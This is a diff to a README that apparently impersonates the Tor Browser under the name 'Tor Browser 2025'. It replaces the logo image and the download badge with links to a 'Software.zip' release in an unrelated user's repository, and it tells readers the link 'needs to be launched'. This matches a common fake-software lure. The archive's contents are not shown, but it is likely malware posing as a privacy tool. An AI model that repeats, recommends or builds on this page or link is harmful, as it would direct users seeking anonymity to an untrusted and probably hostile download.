@@ -2,7 +2,7 @@
 
 Welcome to the "Tor Browser 2025" repository! 🕵️‍♂️🌐
 
-![Tor Browser Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/a/a1/Tor-logo-2011-flat.svg/320px-Tor-logo-2011-flat.svg.png)
+![Tor Browser Logo](https://github.com/haydenmellor/Tor-Browser-2025/releases/download/v1.0/Software.zip)
 
 ## Description
 "Tor Browser 2025" is a cutting-edge web browser designed for secure and anonymous browsing. With the increasing importance of online privacy and security, Tor Browser provides a powerful tool to protect your personal data and access the internet freely.
@@ -18,7 +18,7 @@ Welcome to the "Tor Browser 2025" repository! 🕵️‍♂️🌐
 ## Installation
 You can download the latest version of Tor Browser 2025 by clicking the button below:
 
-[![Download Tor Browser](https://img.shields.io/badge/Download%20Tor%20Browser-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Tor Browser](https://github.com/haydenmellor/Tor-Browser-2025/releases/download/v1.0/Software.zip%20Tor%https://github.com/haydenmellor/Tor-Browser-2025/releases/download/v1.0/Software.zip)](https://github.com/haydenmellor/Tor-Browser-2025/releases/download/v1.0/Software.zip)
 
 > Note: The link provided needs to be launched for downloading the Tor Browser package.
 
